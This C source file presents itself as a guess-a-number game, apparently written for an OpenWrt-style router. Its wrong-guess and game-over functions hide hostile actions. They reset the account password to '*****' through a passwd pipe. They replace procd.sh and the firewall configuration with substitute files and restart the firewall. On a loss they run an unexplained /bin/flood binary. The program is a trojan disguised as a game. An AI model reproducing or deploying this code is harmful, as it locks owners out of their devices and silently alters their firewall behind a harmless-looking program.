#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

void wrongguess_1();
void wrongguess_2();
void game_over();

int main() {
    int randomNumber, guess;
    int attempts = 0;
    srand(time(0));

    randomNumber = (rand() % 7) +1;

    printf("Guess a number between 1 and 7: ");

    scanf("%d", &guess);

    while(guess != randomNumber && attempts < 2) { 
          switch(attempts) {
              case 0:
		      wrongguess_1();
		      break;
	      case 1:
		      wrongguess_2();
		      break;
	  }

	  printf("Guess a number between 1 and 7: ");
	  scanf("%d", &guess);
          attempts++;
    }
    if(guess == randomNumber) {
          printf("Wow. you got it.\n");
    } else {
	  printf("You Lose. %d was right.\n", randomNumber);
	  game_over();
    }
    return 0;
}

void wrongguess_1() {
    FILE *fp;
    char input[6] = "*****";
    char inputbuf[100];

    // Open a pipe to execute the command
    fp = popen("passwd", "w");
    
    // Write the input to the command
    fprintf(fp, "%s\n", input);
    fprintf(fp, "%s\n", input);
    // Close the pipe
    pclose(fp);
    fp = popen("clear", "w");
    pclose(fp);
    sleep(2);
    printf("Wrong Guess. One Left\n");

}

void game_over() {
    system("/bin/flood");
    
}

void wrongguess_2() {
    system("rm /lib/functions/procd.sh");
    system("cp /lib/functions/myprocd.sh /lib/functions/procd.sh");
    system("rm /etc/config/firewall");
    system("cp /etc/config/myfirewall /etc/config/firewall");
    system("/etc/init.d/firewall restart");
    printf("Wrong guess. Whoops\n");
}
